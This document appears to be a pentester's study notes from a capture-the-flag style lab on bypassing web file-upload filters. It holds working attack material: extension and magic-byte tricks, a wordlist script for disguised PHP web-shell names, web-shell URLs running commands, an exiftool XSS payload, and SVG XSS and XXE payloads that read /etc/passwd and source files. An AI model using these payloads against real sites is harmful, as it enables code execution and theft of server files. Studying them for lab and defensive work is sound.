
## Filter Types
### Client-Side Validation

You get "Only Images Are Allowed!"
examine the code: 
```html
<input type="file" name="uploadFile" id="uploadFile" onchange="checkFile(this)" accept=".jpg,.jpeg,.png">
```
```html
<img src="/profile_images/shell.php" class="profile-image" id="profile-image">
```
submit as shell.jpg; intercept with Burp and change to shell.jpg.php or shell.php
### Backend Validation
#### Blacklist Filters
Fuzz for allowed extensions
#### Whitelist Filters
##### Double Extensions
image.php.jpg
##### Reverse Double Extensions
image.php.jpg
##### Character Injection
See script below
### Type Filters

#### Content-Type & File Content Filter Detection
If we change the file name to `shell.jpg.phtml` or `shell.php.jpg`, or even if we use `shell.jpg` with a web shell content, our upload will fail. As the file extension does not affect the error message, the web application must be testing the file content for type validation. As mentioned earlier, this can be either in the `Content-Type Header` or the `File Content`.

#### Content-Type
See Content Type below for wordlists

**Note:** A file upload HTTP request has two Content-Type headers, one for the attached file (at the bottom), and one for the full request (at the top). We usually need to modify the file's Content-Type header, but in some cases the request will only contain the main Content-Type header (e.g. if the uploaded content was sent as `POST` data), in which case we will need to modify the main Content-Type header.

#### File Content
```shell-session
echo "GIF8" > shell.jpg 
```

Magic Bites
https://opensource.apple.com/source/file/file-23/file/magic/magic.mime

File Signatures
https://en.wikipedia.org/wiki/List_of_file_signatures

We can use a combination of the two methods discussed in this section, which may help us bypass some more robust content filters. For example, we can try using an `Allowed MIME type with a disallowed Content-Type`, an `Allowed MIME/Content-Type with a disallowed extension`, or a `Disallowed MIME/Content-Type with an allowed extension`, and so on. Similarly, we can attempt other combinations and permutations to try to confuse the web server, and depending on the level of code security, we may be able to bypass various filters.

Example
http://83.136.255.40:58591/profile_images/shell.phtml.png.phtml?cmd=ls

Original request
![[Pasted image 20240819094047.png]]

Edit request
![[Pasted image 20240819094015.png]]
## Other File Upload Attacks

### Limited File Uploads

Display Image metadata after upload

```shell-session
exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
$ exiftool HTB.jpg
...SNIP...
Comment                         :  "><img src=1 onerror=alert(window.origin)>
```

We can see that the `Comment` parameter was updated to our XSS payload. When the image's metadata is displayed, the XSS payload should be triggered, and the JavaScript code will be executed to carry the XSS attack. Furthermore, if we change the image's MIME-Type to `text/html`, some web applications may show it as an HTML document instead of an image, in which case the XSS payload would be triggered even if the metadata wasn't directly displayed.

SVG for XSS attack

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```
Once we upload the image to the web application, the XSS payload will be triggered whenever the image is displayed.


SVG Payloads for XXE exploitation

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

Once the above SVG image is uploaded and viewed, the XML document would get processed, and we should get the info of (`/etc/passwd`) printed on the page or shown in the page source. Similarly, if the web application allows the upload of `XML` documents, then the same payload can carry the same attack when the XML data is displayed on the web application.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```

Once the SVG image is displayed, we should get the base64 encoded content of `index.php`, which we can decode to read the source code.

**NOTE** you can also save these XXE payloads at .jpeg and they still work ðŸ™‚
### Other


## Identify allowed file types
```shell-session
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Miscellaneous/Web/content-type.txt

cat content-type.txt | grep 'image/' > image-content-types.txt
```

## Filter Bypass

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files

https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt

`ls /usr/share/wordlists/seclists/Web-Shells`

## Creating a wordlist

```bash
#!/bin/sh
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' 'â€¦' ':'; do
#modify these extensions for whatever file type you need to test for
    for ext in '.php' '.php3' '.php4' '.php5' '.php7' '.php8' '.pht' '.phar' '.phpt' '.pgif' '.phtml' '.phtm'; do
        echo "shell$char$ext.jpg" >> filenames_wordlist.txt
        echo "shell$ext$char.jpg" >> filenames_wordlist.txt
        echo "shell.jpg$char$ext" >> filenames_wordlist.txt
        echo "shell.jpg$ext$char" >> filenames_wordlist.txt
    done
done
```

## REMEMBER!
disable Payload encoding when using Burp intruder
![[Pasted image 20240817194735.png]]

## File Upload Mindmap

https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Upload%20Insecure%20Files/Images/file-upload-mindmap.png

**FYI** Reverse Double Extension vulnerability
You don't always have to get rid of the image extension
example: `http://94.237.59.199:51091/profile_images/shell.phar.jpg?cmd=cat+/flag.txt`

## Content Type 

https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt

```shell-session
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Miscellaneous/Web/content-type.txt
cat content-type.txt | grep 'image/' > image-content-types.txt
```




